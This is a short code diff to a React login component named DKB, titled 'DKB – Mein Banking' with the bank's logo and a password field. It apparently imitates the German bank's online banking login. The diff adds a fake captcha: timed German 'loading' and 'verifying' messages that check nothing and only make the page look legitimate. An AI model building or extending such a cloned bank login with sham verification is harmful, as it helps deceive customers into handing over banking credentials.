@@ -35,10 +35,25 @@ const DKB = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [showLoading, setShowLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
+  // Captcha-Demo: "idle" | 0..2 (Ladeschritt) | "done"
+  const [captcha, setCaptcha] = useState<"idle" | 0 | 1 | 2 | "done">("idle");
 
   useEffect(() => {
     window.scrollTo(0, 0);
   }, []);
+
+  useEffect(() => {
+    if (captcha === "idle" || captcha === "done") return;
+    const next = captcha === 0 ? 1 : captcha === 1 ? 2 : "done";
+    const t = setTimeout(() => setCaptcha(next as typeof captcha), 1200);
+    return () => clearTimeout(t);
+  }, [captcha]);
+
+  const CAPTCHA_LOADING_TEXTS = [
+    "Initialisierung…",
+    "Herausforderung laden…",
+    "Das Ergebnis wird überprüft…",
+  ];
   usePageMeta("DKB – Mein Banking", logoAsset.url);
 
   const handleSubmit = async (e: React.FormEvent) => {
